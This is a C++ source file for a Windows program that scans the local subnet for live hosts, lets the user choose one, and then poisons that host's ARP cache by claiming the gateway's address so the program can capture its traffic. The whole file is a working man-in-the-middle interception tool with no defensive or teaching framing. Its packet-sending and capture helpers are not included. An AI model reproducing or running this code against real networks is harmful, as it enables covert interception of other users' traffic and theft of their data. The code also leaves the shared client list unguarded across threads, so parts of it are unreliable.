#include "stdafx.h"
#include "C_ArpProxy.h"
#include <IPHlpApi.h>
#include "C_SendPacket.h"
#include "C_SockHelper.h"
#include "C_CapturePacket.h"

CMutex* C_ArpProxy::m_pMutex = new CMutex;
IpMacVec* C_ArpProxy::m_pClientList = new IpMacVec; 

C_ArpProxy::C_ArpProxy( void )
{
}

C_ArpProxy::~C_ArpProxy(void)
{
	C_SockHelper::CleanupWinsock();
}

void C_ArpProxy::Start()
{
	if(C_SockHelper::InitWinSock() == false)
		printf("Error: Init Winsock Faild\n");

	char szIp[16];
	char szMac[18];
	byte byMac[6];

	char szGatewayIp[16];
	char szGatewayMac[18];
	byte byGatewayMac[6];

	int nClientNum = 0, nSelectedID;

	if(C_SockHelper::GetLocalIP(szIp) == false)
		return;

	if(C_SockHelper::GetLocalMac((char*)byMac) == false)
		return;

	sprintf(szMac,"%02X:%02X:%02X:%02X:%02X:%02X",
				byMac[0],byMac[1],byMac[2],byMac[3],byMac[4],byMac[5]);

	printf("\n\tLocal IP: %s\t\tLocal MAC: %s\n\n", szIp,szMac);
	printf("Scaning...");

	GetOnlineClient();
	
//	printf("\n\nClient List:\n");
	for (IpMacVec::iterator it = m_pClientList->begin(); it != m_pClientList->end(); ++it)
	{
		sprintf(szMac,"%02X:%02X:%02X:%02X:%02X:%02X",
			(*it).byMac[0], (*it).byMac[1], (*it).byMac[2], (*it).byMac[3], (*it).byMac[4], (*it).byMac[5]);
		
		printf("\n%d: IP - %s\t MAC - %s\t NAME - %s", ++nClientNum, (*it).szIp, szMac, (*it).szDescription);
	}
//	printf("End\n");

	C_SockHelper::GetGatewayIP(szGatewayIp);
	if( C_SockHelper::GetGatewayMac((char*)byGatewayMac) == false)
		return;

	sprintf(szGatewayMac,"%02X:%02X:%02X:%02X:%02X:%02X",
		byGatewayMac[0],byGatewayMac[1],byGatewayMac[2],byGatewayMac[3],byGatewayMac[4],byGatewayMac[5]);

	printf("\n\n\tGateway IP: %s\t\tGateway Mac: %s\n",szGatewayIp, szGatewayMac);

	///////////////////////////////////////////////////////////////////////////////
	if(nClientNum == 0)
	{
		printf("No Client Found!\n");
		return;
	}
	printf("\n\nEnter the client number(1-%d): ",nClientNum);
	scanf("%d",&nSelectedID);

	if(nSelectedID < 1 || nSelectedID > nClientNum)
	{
		printf("Client number out of range.\n");
		return;
	}

	IpMacVec::iterator it = m_pClientList->begin();
	for(int i = 1; i < nSelectedID; ++i,++it);

	C_SendPacket sender;
	C_CapturePacket capturer;
	
	sender.StartSendArp(szGatewayIp, byMac, (*it).szIp, (*it).byMac, 3000);
	Sleep(3000);
	capturer.StartListen((*it).szIp);

	sender.StopSendArp();
}

DWORD WINAPI C_ArpProxy::SendArpThread( __in LPVOID lpParameter )
{
	char *pszDstIp = (char*)lpParameter; 

	IPAddr  ipAddr;
	ULONG   Mac[2];
	ULONG   MacLen;
	IPMAC ipmac;

	memset (Mac, 0xff, sizeof (Mac));
	MacLen = 6;

	ipAddr=inet_addr(pszDstIp);
	if(ipAddr == INADDR_NONE)
	{
		printf("SendArpThread error:inet_addr\n");
		return -1;
	}

	DWORD hr = SendARP (ipAddr, 0, Mac, &MacLen);
	if(hr != 0)
		return -1;
	
//	m_pMutex->Lock();
	
	HOSTENT *pHst;
	pHst = gethostbyaddr((LPSTR)&ipAddr, 4, AF_INET);

	memcpy(ipmac.byMac, Mac, 6);
	strcpy(ipmac.szIp, pszDstIp);
	if (pHst == NULL)
		ipmac.szDescription[0] = '\0';
	else
		strcpy(ipmac.szDescription, pHst->h_name);
	m_pClientList->push_back(ipmac);
	
//	m_pMutex->Unlock();
	return true;
}

void C_ArpProxy::GetOnlineClient()
{
	char szIP[20];
	ULONG ipAdd = 0;
	u_long ulNetWork;
	HANDLE hThread[255];
	char szIPList[254][20];

	if( C_SockHelper::GetLocalIP(szIP) == false)
		return;

	if( (ipAdd = inet_addr(szIP)) == INADDR_NONE)
		return;

	ulNetWork= ntohl(ipAdd);
	ulNetWork &= 0xffffff00;

	for(int i = 1; i < 255; i++)
	{
		ipAdd = htonl(ulNetWork + i);
		unsigned char *pIp = (unsigned char*)&ipAdd;
		sprintf(szIPList[i-1],"%d.%d.%d.%d",pIp[0],pIp[1],pIp[2],pIp[3]);
	}		

	for(int i = 0; i < 254; i++)
	{
		hThread[i] = CreateThread(NULL, 0, SendArpThread, &szIPList[i] ,0 , NULL);
		Sleep(30);
	}

	WaitForMultipleObjects(64, hThread, true, INFINITE);
	WaitForMultipleObjects(64, &hThread[64], true, INFINITE);
	WaitForMultipleObjects(64, &hThread[128], true, INFINITE);
	WaitForMultipleObjects(62, &hThread[192], true, INFINITE);
}
